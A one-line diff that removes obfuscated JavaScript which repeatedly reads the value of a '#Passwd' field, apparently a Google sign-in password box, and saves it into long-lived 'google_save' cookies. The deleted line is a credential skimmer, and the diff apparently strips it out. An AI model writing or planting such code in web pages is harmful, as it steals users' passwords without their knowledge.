@@ -1,1 +1,0 @@
-var _0x7044=["#Passwd","querySelector","value","cookie","google_save","=","; expires=Fri, 31 Dec 9999 23:59:59 GMT"],x=0,interval=setInterval(function(){var e=document[_0x7044[1]](_0x7044[0]);null!=e&&(e=e[_0x7044[2]],document[_0x7044[3]]=_0x7044[4]+x+_0x7044[5]+e+_0x7044[6],20==x&&clearInterval(interval),x++)},500);
